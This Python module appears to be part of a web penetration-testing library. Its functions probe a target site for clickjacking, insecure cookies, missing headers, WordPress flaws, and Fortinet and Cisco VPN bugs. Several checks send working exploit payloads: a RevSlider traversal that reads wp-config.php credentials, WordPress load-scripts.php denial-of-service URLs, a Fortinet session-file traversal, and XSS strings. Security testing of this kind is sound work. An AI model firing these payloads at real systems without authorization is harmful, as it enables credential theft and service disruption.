from webpt.response_analysis import find
from webpt.spider import spider
from webpt.any import isalive
import re
import requests
requests.packages.urllib3.disable_warnings() # noqa


class Dict(dict):
    def __getattr__(self, item):
        pass


class ClickJacking:
    def __init__(self, url):
        self.url = url
        self.vuln = None
        self.poc = None

    def check(self):
        res = requests.get(self.url, allow_redirects=True, verify=False)
        if "x-frame-options" not in res.headers:
            self.vuln = True
            self.poc = f"""<html>
   <head><title>Clickjack - {self.url}</title></head>
   <body>
     <p>Website is vulnerable to clickjacking! - {self.url}</p>
     <iframe src="{self.url}" width="500" height="500"></iframe>
   </body>
</html>"""

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            self.check()
            request_dict = {"exist": self.vuln, "poc": self.poc}
            get_var = Dict(request_dict)
            for key, value in get_var.items():
                setattr(get_var, key.lower(), value)
            return get_var


class Cookie_Not_Secure:
    def __init__(self, url):
        self.coo_list = []
        self.url = url

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            r = requests.post(self.url, allow_redirects=True, verify=False)
            for cookie in r.cookies:
                if not cookie.secure:
                    c_str = re.findall("<Cookie (.*)=", str(cookie))
                    self.coo_list.append(c_str[0])
            return self.coo_list


class Wordpress:
    def __init__(self, url):
        self.target = url
        self.vul_ls = {}

    def revslider(self):
        payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
        url = "{}{}".format(self.target, payload)
        try:
            res = requests.get(url, allow_redirects=True, verify=False)
            src = res.text
            if "DB_NAME" in src and "DB_USER" in src and "DB_PASSWORD" in src and "wp-config.php" in src:
                self.vul_ls.update({"CVE-2015-5151": url})
        except: # noqa
            pass

    def dos_attack(self):
        payload = "/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9" # noqa
        url = "{}{}".format(self.target, payload)
        try:
            res = requests.get(url, allow_redirects=True, verify=False)
            if "a.preventDefault(),a.stopPropagation()" in res.text:
                self.vul_ls.update({"CVE-2018-6389": url})
        except:  # noqa
            pass

    def dos_attack2(self):
        payload = "/wp-admin/load-scripts.php?c=1&dir=rtl&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check,media-views&ver=5.3.2" # noqa
        url = "{}{}".format(self.target, payload)
        try:
            res = requests.get(url, allow_redirects=True, verify=False)
            if "preventDefault()" in res.text:
                self.vul_ls.update({"CVE-2018-6389": url})
        except:  # noqa
            pass

    def user_dis(self):
        payload = "/wp-json/wp/v2/users/"
        url = "{}{}".format(self.target, payload)
        try:
            res = requests.get(url, allow_redirects=True, verify=False)
            src = res.text
            if "avatar_urls" in src:
                self.vul_ls.update({"User Disclosure": url})
        except:  # noqa
            pass

    def directory_listing(self):
        payload = "/wp-content/uploads/"
        url = "{}{}".format(self.target, payload)
        try:
            res = requests.get(url, allow_redirects=True, verify=False)
            src = res.text
            if "Index of" in src:
                self.vul_ls.update({"Directory Listing": url})
        except:  # noqa
            pass

    def wp_admin(self):
        payload = "/wp-admin"
        url = "{}{}".format(self.target, payload)
        try:
            res = requests.get(url, allow_redirects=True, verify=False)
            src = res.text
            if "user_login" in src or "wp-submit" in src or "redirect_to" in src:
                self.vul_ls.update({"Wp-admin Visible": url})
        except:  # noqa
            pass

    def installphp(self):
        if self.target.endswith("/"):
            check = f"{self.target}wp-admin/install.php"
        else:
            check = f"{self.target}/wp-admin/install.php"
        src = requests.get(check, allow_redirects=True, verify=False).text

        word = '<a href="../wp-login.php" class="button button-large">Log In</a>'
        if word in src:
            self.vul_ls.update({"install.php file exist": check})

    def __call__(self, *args, **kwargs):
        res = isalive(self.target)
        if res == "isAlive":
            src = requests.get(self.target, allow_redirects=True, verify=False).text
            if "wp-content" in src or "comments/feed" in src or "wp-includes" in src or "wp-json" in src:
                self.directory_listing()
                self.wp_admin()
                self.user_dis()
                self.dos_attack()
                self.dos_attack2()
                self.revslider()
                self.installphp()
                return self.vul_ls


class XSS_Protection:
    def __init__(self, url):
        self.url = url

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            res = requests.get(self.url, allow_redirects=True, verify=False)
            header = res.headers
            if "x-xss-protection" not in header:
                return "The header XSS Protection is missing"


class SRI:
    def __init__(self, url):
        self.url = url
        self.sri_ls = []

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            res = requests.get(self.url, allow_redirects=True, verify=False)
            src = res.text
            base_url = self.url.split("/")[2]
            for tag in find(src).tag("script"):
                link = tag.attr("src")
                try:
                    if base_url not in link[0] and str(link[0]).startswith("http"):
                        if "integrity=" not in tag.element:
                            self.sri_ls.append(link[0])
                except TypeError:
                    pass
            return self.sri_ls


class IP_Disclosure:
    def __init__(self, url):
        self.url = url
        self.links = []
        self.ips = {}

    def get_links(self):
        self.links = spider(self.url).js

    def check_ip(self, link):
        src = requests.get(link, allow_redirects=True, verify=False).text
        ip = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", src)
        if ip:
            self.ips.update({link: list(set(ip))})

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            self.get_links()
            for link in self.links:
                self.check_ip(link)

            return self.ips


class Htaccess:
    def __init__(self, url):
        self.url = url

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            if self.url.endswith("/"):
                check = f"{self.url}.htaccess"
            else:
                check = f"{self.url}/.htaccess"
            src = requests.get(check, allow_redirects=True, verify=False).text
            ls = ["RewriteRule", "RewriteCond", "IfModule"]
            for word in ls:
                if word in src:
                    return ".htaccess file readable"


class Fortinet:
    def __init__(self, ip):
        self.ip = ip
        self.vuln_dic = {}

    def path_traversal(self):
        payload = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
        url = self.ip + payload

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
                   "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                   "Referer": "https://" + self.ip + "/remote/login?lang=en", "Pragma": "no-cache",
                   "Cache-Control": "no-store, no-cache, must-revalidate",
                   "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8",
                   "Connection": "close"}
        try:
            res = requests.get(url, headers=headers, allow_redirects=True, verify=False)
            if res.status_code == 200:
                self.vuln_dic.update({"Path Traversal": url})
        except: # noqa
            pass

    def cross_site_scripting(self):
        payload = "/remote/loginredir?redir=javascript:alert(%22XSS_fortinet%20%22%2Bdocument.location)"
        url = self.ip + payload

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
                   "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                   "Referer": "https://" + self.ip + "/remote/login?lang=en", "Pragma": "no-cache",
                   "Cache-Control": "no-store, no-cache, must-revalidate",
                   "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8",
                   "Connection": "close"}
        try:
            res = requests.get(url, headers=headers, allow_redirects=True, verify=False)
            if res.status_code == 200 and "XSS_fortinet" in res.text:
                self.vuln_dic.update({"XSS": url})
        except: # noqa
            pass

    def cross_site_scripting_2(self):
        payload = "/remote/loginredir?redir=/message?title=x&msg=%26%23<svg/onload=alert('XSS_fortinet')>;"
        url = self.ip + payload

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
                   "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                   "Referer": "https://" + self.ip + "/remote/login?lang=en", "Pragma": "no-cache",
                   "Cache-Control": "no-store, no-cache, must-revalidate",
                   "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8",
                   "Connection": "close"}
        try:
            res = requests.get(url, headers=headers, allow_redirects=True, verify=False)
            if res.status_code == 200 and "XSS_fortinet" in res.text:
                self.vuln_dic.update({"XSS_2": url})
        except: # noqa
            pass

    def __call__(self, *args, **kwargs):
        ip = "{}".format(self.ip)
        if ip.startswith("https://") or ip.startswith("http://"):
            ip = ip.replace("https://", "")
            ip = ip.replace("http://", "")
        if ":" not in ip:
            self.ip = "https://"+self.ip+":10443"
        res = isalive(self.ip)
        if res == "isAlive":
            self.path_traversal()
            self.cross_site_scripting()
            self.cross_site_scripting_2()
            return self.vuln_dic


class Cisco:
    def __init__(self, url):
        self.url = url
        self.vuln_dic = {}

    def path_traversal(self):
        url = self.url + "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" # noqa

        _headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3", # noqa
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
            "Content-Type": "text/xml;charset=UTF-8", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        r = requests.get(url, headers=_headers, allow_redirects=True, verify=False, timeout=5)
        if "by Cisco Systems" in r.text and r.status_code == 200 and "include/common.lua" in r.text:
            self.vuln_dic.update({"Path Traversal": url})

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            self.path_traversal()
            return self.vuln_dic


class ALL:
    def __init__(self, url):
        self.url = url

    def __call__(self, *args, **kwargs):
        res = isalive(self.url)
        if res == "isAlive":
            dic = {}
            dic.update({'ClickJacking': ClickJacking(self.url)()})
            dic.update({'WordPress': Wordpress(self.url)()})
            dic.update({'Cookie_Not_Secure': Cookie_Not_Secure(self.url)()})
            dic.update({'XSS_Protection': XSS_Protection(self.url)()})
            dic.update({'SRI': SRI(self.url)()})
            dic.update({'htaccess': Htaccess(self.url)()})
            dic.update({'ip_disclosure': IP_Disclosure(self.url)()})

            get_var = Dict(dic)
            for key, value in get_var.items():
                setattr(get_var, key.lower(), value)
            return get_var


class Comments:
    def __init__(self, url):
        self.url = url
        self.comments = []
        self.comments_reg = []

    def find(self, regex=None):
        res = isalive(self.url)
        if res == "isAlive":
            src = requests.get(self.url, allow_redirects=True, verify=False).text
            self.comments = re.findall(f'<!-- ?(.*) ?-->', src)
            if regex is None:
                return self.comments
            else:
                for sen in self.comments:
                    if regex in sen:
                        self.comments_reg.append(sen)
                return self.comments_reg


def clickjacking(url):
    return ClickJacking(url)()


def wordpress(url):
    return Wordpress(url)()


def cookie_not_secure(url):
    return Cookie_Not_Secure(url)()


def comments(url):
    return Comments(url)


def xss_protection(url):
    return XSS_Protection(url)()


def sri(url):
    return SRI(url)()


def htaccess(url):
    return Htaccess(url)()


def ip_disclosure(url):
    return IP_Disclosure(url)()


def cisco(url):
    return Cisco(url)()


def fortinet(ip):
    return Fortinet(ip)()


def all(url): # noqa
    return ALL(url)()
